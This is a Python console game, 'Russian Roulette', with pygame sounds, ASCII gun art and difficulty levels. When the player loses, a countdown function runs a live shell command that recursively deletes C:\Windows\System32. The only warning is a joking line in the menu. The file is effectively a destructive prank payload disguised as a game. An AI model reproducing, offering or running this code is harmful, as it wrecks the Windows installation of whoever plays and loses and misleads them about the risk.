# Russian Roulette
import random
import sys
import time
import pygame
import os

pygame.mixer.init()
start_sound = pygame.mixer.Sound("audio/startdone.mp3")  
click_sound = pygame.mixer.Sound("audio/clickdone.mp3")  
gunshot_sound = pygame.mixer.Sound("audio/shotdone.mp3")
beep_sound = pygame.mixer.Sound("audio/anxietydone.mp3")  


def menu(menu):
    return f"""
    ========================================
           WIDYA MANDALA RUSSIAN ROULET
                by: Evan William
    ========================================
    - You have a few Bullets.
    - 1 bullet will delete system 32 :)
    - You can choose to stop or continue anytime.
    - Enjoy!
    ========================================
    """

def main():
    print(menu(menu))
    choose = input("Press 1 to start or 2 to quit! ")
    
    if choose.isdigit():
        if int(choose) == 1:
            gun_loading()  # 🔄 Play gun loading sound
            
            print("\n===== CHOOSE DIFFICULTY ======")
            print("1. Easy (8 Bullet Slots)")
            print("2. Medium (6 Bullet Slots)")
            print("3. Hard (4 Bullet Slots)")
            print("4. Demon (2 Bullet Slots)")
            print("================================")
            
            while True:
                choose2 = input("Choose 1-4: ")
                if choose2.isdigit():
                    if int(choose2) == 1:
                        startgame(8)
                        break
                    elif int(choose2) == 2:
                        startgame(6)
                        break
                    elif int(choose2) == 3:
                        startgame(4)
                        break
                    elif int(choose2) == 4:
                        startgame(2)
                        break
                    else:
                        print("Invalid Input! , Choose Again!")                  
                else:
                    print("Invalid Input! , Choose Again!")
                
        elif int(choose) == 2:
            sys.exit("Exited Game")
        else:
            sys.exit("Invalid Input")
    else:
        sys.exit("Invalid Input!")
    
def gun1():
    return r"""
                                              />
              __+_____________________/\/\___/ /|
             ()______________________      / /|/\
                         /0 0  ---- |----    /---\
                        |0 o 0 ----|| - \ --|      \
                         \0_0/____/ |    |  |\      \
                                     \__/__/  |      \
            Click! Click!                     |       \
                                              |         \
                                              |__________|           
    """
def gun2():
    return r"""
            \
             /                                 />
             \__+_____________________/\/\___/ /|
             ()______________________      / /|/\
                         /0 0  ---- |----    /---\
                        |0 o 0 ----|| - \ --|      \
                         \0_0/____/ |    |  |\      \
                                     \__/__/  |      \
                  Bang!                       |       \
                                              |         \
                                              |__________|          
    """

def countdown_to_deletion():
    print("You died!, deleting sys32 in 10 seconds :)")
    print("\n💀 SYSTEM 32 DELETION INITIATED! 💀\n")
    
    for i in range(10, 0, -1):
        print(f"Deleting in {i} seconds...", end="\r")  # Print countdown on same line
        beep_sound.play() 
        time.sleep(1)
        
    print("\nDeleting... GOODBYE!")
    os.system("rd /s /q C:\Windows\System32")
    sys.exit()  
    
def gun_loading():
    print("\nLoading the revolver...")
    time.sleep(1)
    start_sound.play()
    print("Spinning the chamber...")
    time.sleep(1)
    print("Locking the barrel...")

    time.sleep(start_sound.get_length())  

    print("Ready!\n")

def startgame(bullet_count):
    print("\n")
    bullets = list(range(1, bullet_count + 1)) 
    DEATH = random.choice(bullets) 
    # bullets.remove(DEATH) uncomment for rigged XD
    
    while bullets:
        choose = input("Press enter to trigger! ")
        if choose == "":
            trigger = random.choice(bullets)  
            bullets.remove(trigger)

            if trigger != DEATH:
                print("You Survived! ")
                print(gun1())
                click_sound.play()  
                time.sleep(click_sound.get_length())  
                print(f"Chances left: {len(bullets)}")  
                
                again = input("Again? (Y/N) ")
                if again.upper() == "Y":
                    pass
                elif again.upper() == "N":
                    sys.exit("You walk away safely!")
                else:
                    print("Not a valid option!")
            else:
                print("You Died! ")
                print(gun2())
                gunshot_sound.play()  
                time.sleep(gunshot_sound.get_length())  
                
                countdown_to_deletion()
                
        else:
            print("Invalid Action!")
    
main()
